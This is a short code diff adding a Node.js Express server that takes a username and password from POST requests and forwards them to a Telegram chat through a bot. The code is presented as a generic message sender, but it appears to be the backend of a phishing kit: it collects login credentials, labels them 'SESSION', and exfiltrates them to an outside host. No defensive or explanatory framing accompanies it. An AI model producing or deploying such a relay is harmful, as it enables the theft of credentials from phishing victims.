@@ -1,0 +1,40 @@
+const TelegramBot = require('node-telegram-bot-api');
+const express = require('express');
+const bodyParser = require('body-parser');
+
+const app = express();
+const port = 3000;
+
+// replace the value below with the Telegram token you receive from @BotFather
+const token = 'YOUR_TELEGRAM_BOT_TOKEN';
+
+// Create a bot instance
+const bot = new TelegramBot(token);
+
+// Middleware to parse the request body
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(bodyParser.json());
+
+// Endpoint to receive data and send a message
+app.post('/send-message', (req, res) => {
+    // Construct the message from the request payload
+    const userName = req.body.userName;
+    const password = req.body.password;
+    const message = `SESSION\nlogin username= ${userName}\npassword = ${password}`;
+
+    // Define the chat ID
+    const chatId = 'CHAT_ID';  // Replace with the target chat ID
+
+    // Send the message
+    bot.sendMessage(chatId, message).then(() => {
+        console.log('Message sent successfully');
+        res.send('Message sent successfully');
+    }).catch((error) => {
+        console.error('Error sending message:', error);
+        res.status(500).send('Error sending message');
+    });
+});
+
+app.listen(port, () => {
+    console.log(`Server is running on port ${port}`);
+});
